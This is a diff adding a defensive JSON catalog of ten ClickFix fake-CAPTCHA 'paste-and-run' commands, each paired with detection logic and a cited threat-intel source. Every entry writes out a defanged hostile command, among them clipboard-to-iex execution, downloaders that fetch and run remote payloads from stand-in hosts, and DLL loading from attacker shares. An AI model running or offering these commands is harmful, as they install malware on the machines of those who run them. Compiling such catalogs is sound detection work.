@@ -1,0 +1,110 @@
+{
+  "meta": {
+    "title": "ClickFix Command Catalog",
+    "purpose": "Defensive threat-intel reference of ClickFix (fake-CAPTCHA / paste-and-run) command patterns for detection engineering and threat hunting.",
+    "warning": "All commands are DEFANGED malicious samples for DETECTION ONLY. Do not execute. URLs neutralised (hxxp, [.]).",
+    "updated": "2026-08-12"
+  },
+  "entries": [
+    {
+      "id": "cf-0001",
+      "command": "powershell -ep bypass -c \"$repvar=(Get-Clipboard);Set-Clipboard;$repvar|iex|iex\"",
+      "executor": "powershell.exe",
+      "technique": "Clipboard self-execution — reads clipboard, clears it, and pipes to iex twice",
+      "detection": "PowerShell that calls Get-Clipboard then Invoke-Expression/iex in the same command line. Set-Clipboard with no argument (clipboard wipe) is a strong secondary signal.",
+      "source": "Group-IB / Sekoia",
+      "source_url": "hxxps://blog.sekoia[.]io/clickfix-tactic-revenge-of-detection/",
+      "date_added": "2026-08-12"
+    },
+    {
+      "id": "cf-0002",
+      "command": "cmdkey /add:<host> /user:<user> /pass:<pass> & regsvr32 /s \\\\<host>\\share\\payload.dll",
+      "executor": "regsvr32.exe",
+      "technique": "Fake Cloudflare CAPTCHA variant — stores creds with cmdkey, loads a DLL filelessly from an attacker SMB/UNC share; persistence via scheduled task 'RunNotepadNow'",
+      "detection": "regsvr32 loading a DLL from a UNC/SMB path (\\\\host\\...); cmdkey /add immediately before; creation of scheduled task named RunNotepadNow.",
+      "source": "CyberProof (via Mallory / Rapid7 reporting)",
+      "source_url": "hxxps://www.mallory[.]ai/stories/019c8f86-2a83-7716-b011-53cf9e940c23",
+      "date_added": "2026-08-12"
+    },
+    {
+      "id": "cf-0003",
+      "command": "mshta hxxps://malicious[.]site/verify.hta",
+      "executor": "mshta.exe",
+      "technique": "Remote HTA execution launched from the Run dialog after a fake 'verification' step",
+      "detection": "mshta.exe with a remote http(s) URL argument, spawned with a parent of explorer.exe (Run dialog) or a browser.",
+      "source": "Huntress",
+      "source_url": "hxxps://www.huntress[.]com/blog/dont-sweat-clickfix-techniques",
+      "date_added": "2026-08-12"
+    },
+    {
+      "id": "cf-0004",
+      "command": "conhost --headless powershell -w hidden -c \"iex(iwr hxxps://bad[.]site/a)\"",
+      "executor": "conhost.exe",
+      "technique": "conhost --headless used to run a hidden PowerShell downloader without a visible window",
+      "detection": "Any execution of conhost.exe with the --headless argument is almost always malicious in this context.",
+      "source": "Huntress / Sekoia",
+      "source_url": "hxxps://www.huntress[.]com/blog/dont-sweat-clickfix-techniques",
+      "date_added": "2026-08-12"
+    },
+    {
+      "id": "cf-0005",
+      "command": "curl hxxp://bad[.]site/a.exe -o %TEMP%\\a.exe & start %TEMP%\\a.exe",
+      "executor": "curl.exe",
+      "technique": "Native curl download of a payload to %TEMP% then immediate execution",
+      "detection": "curl.exe writing to %TEMP%/%APPDATA% followed by start/execution of the same path within seconds, parented off the Run dialog.",
+      "source": "Group-IB",
+      "source_url": "hxxps://www.group-ib[.]com/blog/clickfix-the-social-engineering-technique-hackers-use-to-manipulate-victims/",
+      "date_added": "2026-08-12"
+    },
+    {
+      "id": "cf-0006",
+      "command": "bitsadmin /transfer job hxxp://bad[.]site/a.exe %TEMP%\\a.exe & %TEMP%\\a.exe",
+      "executor": "bitsadmin.exe",
+      "technique": "BITS transfer used to fetch the payload, evading some download monitoring",
+      "detection": "bitsadmin /transfer to a user-writable path followed by execution; also visible as BITS job creation events.",
+      "source": "Huntress",
+      "source_url": "hxxps://www.huntress[.]com/blog/dont-sweat-clickfix-techniques",
+      "date_added": "2026-08-12"
+    },
+    {
+      "id": "cf-0007",
+      "command": "powershell -w hidden -EncodedCommand <base64>",
+      "executor": "powershell.exe",
+      "technique": "Base64 -EncodedCommand to hide the real downloader/stager from casual inspection",
+      "detection": "powershell.exe with -EncodedCommand / -enc and -w hidden, especially with a RunMRU-originated parent chain. Decode the blob for the true command.",
+      "source": "CyberCentaurs",
+      "source_url": "hxxps://cybercentaurs[.]com/blog/clickfix-malvertising-detection-threat-hunting/",
+      "date_added": "2026-08-12"
+    },
+    {
+      "id": "cf-0008",
+      "command": "msiexec /q /i hxxps://bad[.]site/pkg.msi",
+      "executor": "msiexec.exe",
+      "technique": "Silent install of a remote MSI hosted on attacker infrastructure",
+      "detection": "msiexec.exe /i with a remote http(s) URL and /q (quiet); rare in normal user activity from the Run dialog.",
+      "source": "Group-IB",
+      "source_url": "hxxps://www.group-ib[.]com/blog/clickfix-the-social-engineering-technique-hackers-use-to-manipulate-victims/",
+      "date_added": "2026-08-12"
+    },
+    {
+      "id": "cf-0009",
+      "command": "rundll32 \\\\<host>\\share\\p.dll,Entry",
+      "executor": "rundll32.exe",
+      "technique": "rundll32 loading an exported entry point from a DLL on a remote UNC/WebDAV share",
+      "detection": "rundll32.exe with a UNC/WebDAV (\\\\host\\... or \\\\host@SSL\\...) module path and an export name.",
+      "source": "Sekoia",
+      "source_url": "hxxps://blog.sekoia[.]io/clickfix-tactic-revenge-of-detection/",
+      "date_added": "2026-08-12"
+    },
+    {
+      "id": "cf-0010",
+      "command": "pcalua -a \\\\<host>\\share\\p.exe",
+      "executor": "pcalua.exe",
+      "technique": "Program Compatibility Assistant used as a proxy to launch a remote binary and break the parent-child chain",
+      "detection": "pcalua.exe -a launching a binary, especially from a UNC path; unusual outside legacy-app troubleshooting.",
+      "source": "Huntress",
+      "source_url": "hxxps://www.huntress[.]com/blog/dont-sweat-clickfix-techniques",
+      "date_added": "2026-08-12"
+    }
+  ]
+}
